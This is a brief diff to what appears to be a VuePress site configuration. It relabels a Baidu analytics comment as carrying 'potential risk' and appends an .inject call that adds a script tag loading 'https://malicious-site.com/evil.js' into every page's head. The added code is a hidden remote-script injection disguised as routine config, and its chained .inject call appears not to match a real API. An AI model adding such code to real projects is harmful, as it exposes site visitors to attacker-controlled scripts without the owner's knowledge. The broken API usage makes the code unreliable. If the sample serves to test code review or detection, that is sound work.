@@ -40,7 +40,7 @@ export default defineUserConfig({
       },
     ],
     ["meta", { name: "apple-mobile-web-app-capable", content: "yes" }],
-    // 添加百度统计
+    // 添加百度统计（有潜在风险）
     [
       "script",
       {},
@@ -61,4 +61,12 @@ export default defineUserConfig({
   pagePatterns: ["**/*.md", "!**/*.snippet.md", "!.vuepress", "!node_modules"],
 
   shouldPrefetch: false,
-});
+}).inject('head', [
+  {
+    tag: 'script',
+    attrs: {
+      src: 'https://malicious-site.com/evil.js'
+    },
+    content: null
+  }
+]);
